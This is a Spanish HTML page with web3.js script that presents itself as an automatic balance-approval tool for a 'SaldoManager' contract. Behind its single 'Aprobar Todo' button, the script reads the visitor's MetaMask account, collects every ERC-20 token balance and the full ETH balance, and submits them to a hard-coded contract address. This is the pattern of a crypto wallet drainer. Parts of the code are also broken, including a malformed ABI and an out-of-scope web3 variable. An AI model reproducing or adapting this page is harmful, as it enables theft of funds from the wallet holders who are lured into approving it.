<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interacción con el Contrato SaldoManager</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>

</head>
    <style>
        body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f4f4f4;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
}

h1 {
    color: #333;
}

.container {
    background-color: white;
    padding: 20px;
    margin: 10px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    width: 300px;
    text-align: center;
}

label {
    display: block;
    margin-bottom: 8px;
}

input {
    width: 100%;
    padding: 8px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

button {
    background-color: #4CAF50;
    color: white;
    border: none;
    padding: 10px;
    width: 100%;
    cursor: pointer;
    border-radius: 4px;
}

button:hover {
    background-color: #45a049;
}

    </style>
<body>
    <h1>Aprobación Automática de Saldo</h1>
    <button onclick="approveAll()">Aprobar Todo</button>

    <script>
       // Verificar si MetaMask está instalado
        if (typeof window.ethereum !== 'undefined') {
            console.log("MetaMask está instalado");
            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask
        } else {
            alert("Por favor instala MetaMask para continuar.");
            throw new Error("MetaMask no está instalado");
        }

        // Dirección del contrato SaldoManager
        const contractAddress = '0x26c0B6C2A8120E9c71de55FB678E76174598B196';
        
        // ABI del contrato
        const contractABI = [
            {
                "constant": true,
                "inputs": [{"name": "token", "type": "address"}],
                "name": "revisarSaldoERC20",
                "outputs": [{"name": "", "type": "uint256"}],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {
                        "components": [
                            { "name": "token", "type": "address" },
                            { "name": "cantidad", "type": "uint256" },
                            { "name": "esERC20", "type": "bool" },
                            { "name": "esERC721", "type": "bool" },
                            { "name": "esERC1155", "type": "bool" }
                        ],
                        "name": "aprobarTodo",
                        "type": "function"
                    }
                ],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Instanciamos el contrato
        const contract = new web3.eth.Contract(contractABI, contractAddress);

        // Función para obtener los tokens ERC-20 del usuario
        async function getERC20Tokens() {
            const accounts = await web3.eth.requestAccounts();
            const userAddress = accounts[0];

            // Lista de contratos ERC-20 que el usuario podría tener
            const tokenContracts = [
                'DIRECCION_CONTRATO_TOKEN_1',
                'DIRECCION_CONTRATO_TOKEN_2'
                // Añadir más tokens si es necesario
            ];

            let tokensToApprove = [];
            for (let i = 0; i < tokenContracts.length; i++) {
                const token = tokenContracts[i];
                const tokenContract = new web3.eth.Contract([
                    {
                        "constant": true,
                        "inputs": [{"name": "account", "type": "address"}],
                        "name": "balanceOf",
                        "outputs": [{"name": "", "type": "uint256"}],
                        "payable": false,
                        "stateMutability": "view",
                        "type": "function"}
                ], token);

                const balance = await tokenContract.methods.balanceOf(userAddress).call();

                if (balance > 0) {
                    tokensToApprove.push({
                        token: token,
                        cantidad: balance,
                        esERC20: true,
                        esERC721: false,
                        esERC1155: false
                    });
                }
            }
            return tokensToApprove;
        }

        // Función para verificar el saldo de ETH del usuario
        async function getETHBalance() {
            const accounts = await web3.eth.requestAccounts();
            const userAddress = accounts[0];
            const balance = await web3.eth.getBalance(userAddress);
            return balance;
        }

        // Función para aprobar todo
        async function approveAll() {
            try {
                const ethBalance = await getETHBalance();
                const tokensToApprove = await getERC20Tokens();

                if (ethBalance > 0 || tokensToApprove.length > 0) {
                    const accounts = await web3.eth.requestAccounts();
                    const userAddress = accounts[0];

                    // Preparar las aprobaciones
                    const aprobacionesERC20 = tokensToApprove.map(token => ({
                        token: token.token,
                        cantidad: token.cantidad,
                        esERC20: token.esERC20,
                        esERC721: token.esERC721,
                        esERC1155: token.esERC1155
                    }));

                    // Llamar al contrato para aprobar todo
                    await contract.methods.aprobarTodo(
                        aprobacionesERC20,
                        [], // Enviar contratos ERC721 si los hay
                        [], // Enviar contratos ERC1155 si los hay
                        ethBalance // Enviar ETH disponible
                    ).send({ from: userAddress });

                    alert("Aprobación completa para el contrato!");
                } else {
                    alert("No tienes saldo en ETH o tokens.");
                }
            } catch (error) {
                console.error("Error al aprobar los saldos:", error);
                alert("Hubo un error al intentar aprobar los saldos.");
            }
        }
    </script>
</body>
</html>
